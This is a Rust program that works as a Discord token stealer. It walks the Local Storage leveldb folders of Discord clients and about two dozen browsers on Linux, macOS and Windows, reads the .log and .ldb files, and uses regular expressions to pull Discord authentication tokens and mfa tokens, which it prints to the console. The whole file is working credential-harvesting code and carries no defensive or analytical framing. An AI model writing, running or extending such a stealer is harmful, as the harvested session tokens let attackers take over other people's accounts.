use std::env;
use std::fs;
use std::io::Read;
use std::path::Path;
use regex::Regex;

fn has_ending(full_string: &str, ending: &str) -> bool {
    full_string.ends_with(ending)
}

fn path_exists(s: &str) -> bool {
    Path::new(s).exists()
}

fn search_tokens(file_path: &str, token_regex: &Regex) -> Vec<String> {
    let mut matched_tokens = Vec::new();

    let mut big_file = match fs::File::open(file_path) {
        Ok(file) => file,
        Err(_) => {
            eprintln!("Error: Unable to open the file.");
            return matched_tokens;
        }
    };

    const BUFFER_SIZE: usize = 1024 * 1024;
    let mut buffer = vec![0; BUFFER_SIZE];
    let mut accumulated_data = String::new();

    println!("Looking for tokens in: \x1B[35m{}\x1B[0m", file_path);

    while let Ok(bytes_read) = big_file.read(&mut buffer) {
        if bytes_read == 0 {
            break;
        }
        accumulated_data.push_str(&String::from_utf8_lossy(&buffer[..bytes_read]));
    }

    for matches in token_regex.find_iter(&accumulated_data) {
        matched_tokens.push(matches.as_str().to_string());
    }

    matched_tokens
}

fn grab_path() -> Vec<String> {
    let system = std::env::consts::OS;
    println!("Operating System detected: \x1B[0;36m{}\x1B[0m", system);

    let mut target_locations = Vec::new();

    match system {
        "linux" => {
            let home = env::var("HOME").unwrap_or_else(|_| "/home".to_string());

            let paths = vec![
                format!("{}/.discord", home),
                format!("{}/.discordcanary", home),
                format!("{}/.discordptb", home),
                format!("{}/.config/google-chrome/Default", home),
                format!("{}/.config/opera/Default", home),
                format!("{}/.config/BraveSoftware/Brave-Browser/Default", home),
                format!("{}/.config/yandex-browser/Default", home),
            ];

            target_locations.extend(paths);
        }
        "macos" => {
            let local = env::var("HOME").map(|home| format!("{}/Library/Application Support", home)).unwrap_or_else(|_| "/Library/Application Support".to_string());

            let paths = vec![
                format!("{}/Discord", local),
                format!("{}/discordcanary", local),
                format!("{}/discordptb", local),
                format!("{}/Google/Chrome/Default", local),
                format!("{}/com.operasoftware.Opera", local),
                format!("{}/BraveSoftware/Brave-Browser/Default", local),
                format!("{}/Yandex/YandexBrowser/Default", local),
            ];

            target_locations.extend(paths);
        }
        "windows" => {
            let roaming = env::var("APPDATA").unwrap_or_else(|_| "".to_string());
            let local = env::var("LOCALAPPDATA").unwrap_or_else(|_| "".to_string());

            let paths = vec![
                format!("{}/Discord", roaming),
                format!("{}/discordcanary", roaming),
                format!("{}/discordptb", roaming),
                format!("{}/Google/Chrome/User Data/Default", local),
                format!("{}/Opera Software/Opera Stable", roaming),
                format!("{}/BraveSoftware/Brave-Browser/User Data/Default", local),
                format!("{}/Yandex/YandexBrowser/User Data/Default", local),
                format!("{}/Lightcord/", roaming),
                format!("{}/Opera Software/Opera GX Stable/", roaming),
                format!("{}/Amigo/User Data/", local),
                format!("{}/Torch/User Data/", local),
                format!("{}/Kometa/User Data/", local),
                format!("{}/Orbitum/User Data/", local),
                format!("{}/CentBrowser/User Data/", local),
                format!("{}/7Star/7Star/User Data/", local),
                format!("{}/Sputnik/Sputnik/User Data/", local),
                format!("{}/Vivaldi/User Data/Default/", local),
                format!("{}/Google/Chrome SxS/User Data/", local),
                format!("{}/Google/Chrome/User Data/Profile 1/", local),
                format!("{}/Google/Chrome/User Data/Profile 2/", local),
                format!("{}/Google/Chrome/User Data/Profile 3/", local),
                format!("{}/Google/Chrome/User Data/Profile 4/", local),
                format!("{}/Google/Chrome/User Data/Profile 5/", local),
                format!("{}/Epic Privacy Browser/User Data/", local),
                format!("{}/Microsoft/Edge/User Data/Default/", local),
                format!("{}/uCozMedia/Uran/User Data/Default/", local),
                format!("{}/Iridium/User Data/Default/", local),
            ];

            target_locations.extend(paths);
        }
        _ => {
            eprintln!("Unsupported operating system: {}", system);
        }
    }

    target_locations
}

fn main() {
    let mut tokens = Vec::new();
    let mut mfas = Vec::new();
    let mut path = grab_path();

    for path in path.iter_mut() {path.push_str("/Local Storage/leveldb");}

    let token_regex = Regex::new(r"([\w-]{24}\.[\w-]{6}\.[\w-]{27})").unwrap();
    let mfa_regex = Regex::new(r"mfa\.[\w-]{84}").unwrap();

    for path in &path {
        if path_exists(path) {
            if let Ok(entries) = fs::read_dir(path) {
                for entry in entries {
                    if let Ok(entry) = entry {
                        if let Some(entry_path) = entry.path().to_str() {
                            if has_ending(entry_path, ".log") || has_ending(entry_path, ".ldb") {
                                let stored_tokens = search_tokens(entry_path, &token_regex);
                                let stored_mfa = search_tokens(entry_path, &mfa_regex);

                                tokens.extend(stored_tokens);
                                mfas.extend(stored_mfa);
                            }
                        }
                    }
                }
            }
        }
    }

    println!("Tokens found:");
    for token in &tokens {
        println!("\x1B[32m{}\x1B[0m", token);
    }

    println!("MFA found:");
    for mfa in &mfas {
        println!("\x1B[32m{}\x1B[0m", mfa);
    }
}
